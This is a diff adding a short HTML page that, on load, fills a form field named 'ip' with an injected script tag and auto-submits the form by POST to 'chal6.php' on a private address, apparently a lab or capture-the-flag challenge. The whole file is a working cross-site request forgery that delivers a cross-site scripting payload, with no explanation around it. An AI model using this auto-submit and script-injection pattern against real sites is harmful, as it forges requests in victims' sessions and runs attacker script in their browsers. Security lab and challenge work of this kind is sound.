@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <script>
+            function hack() {
+                document.getElementsByName("ip")[0].value = 'google.com<script>alert("xxxx");<\/script>';
+                document.getElementsByName("postloginusername")[0].submit();
+                }
+            </script>
+        </head>
+        <body onload="hack();">
+            <form method="POST" name="postloginusername" action="https://172.27.20.32:8443/chal6.php">
+                <input name="ip" type="text" value="" >
+            </form>
+        </body>
+    </html>
